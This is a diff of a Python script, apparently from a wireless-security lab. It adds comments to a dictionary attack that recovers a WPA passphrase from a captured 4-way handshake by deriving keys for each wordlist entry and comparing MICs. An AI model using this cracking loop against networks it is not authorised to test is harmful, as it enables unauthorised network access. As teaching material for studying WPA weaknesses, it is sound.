@@ -29,6 +29,7 @@ if __name__ == '__main__':
     ANonce = wpa[5].getlayer(WPA_key).nonce
     SNonce = raw(wpa[6])[65:-72]
     data = raw(wpa[8])[0x30:0x81] + b"\x00" * 16 + raw(wpa[8])[0x91:0x93]
+    # special byte, 0x1 == md5, 0x2 == sha1
     md5 = raw(wpa[8])[0x36]
 
     mic_to_check = raw(wpa[8])[0x81:0x91]
@@ -39,16 +40,19 @@ if __name__ == '__main__':
     data = raw(wpa[8])[0x30:0x81] + b"\x00" * 16 + raw(wpa[8])[0x91:0x93]
 
     for line in f :
+        #removing \r\n to the passphrase
         line = line.replace("\r","")
         line = line.replace("\n","")
         passPhrase = str.encode(line)
         pmk=b""
         # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+        
         if md5 & 0x1 ==0x1:
             pmk = pbkdf2(hashlib.md5, passPhrase, ssid, 4096, 32)
         else:
             pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
         ptk = customPRF512(pmk,str.encode(A),B)
+        #use hmac to calculate mac, then compare it with the mac in the 4way handshake
         mic = hmac.new(ptk[0:16], data, hashlib.sha1)
         if a2b_hex(mic.hexdigest())[0:16] == mic_to_check:
             print("GG ! : ",line)
